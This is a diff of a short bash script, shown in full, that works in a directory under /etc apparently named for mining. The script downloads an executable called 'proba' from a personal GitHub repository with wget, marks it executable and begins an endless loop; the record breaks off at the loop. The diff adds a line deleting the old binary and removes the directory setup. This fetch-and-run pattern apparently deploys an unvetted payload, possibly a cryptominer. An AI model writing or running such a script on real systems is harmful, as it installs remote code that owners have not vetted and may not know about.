@@ -1,8 +1,6 @@
 #!/bin/bash
-cd /etc
-rm -R mine
-mkdir mine
 cd /etc/mine
+rm proba
 wget https://github.com/aleksey1255/ai/raw/main/proba
 chmod u+x proba 
 while true; do 
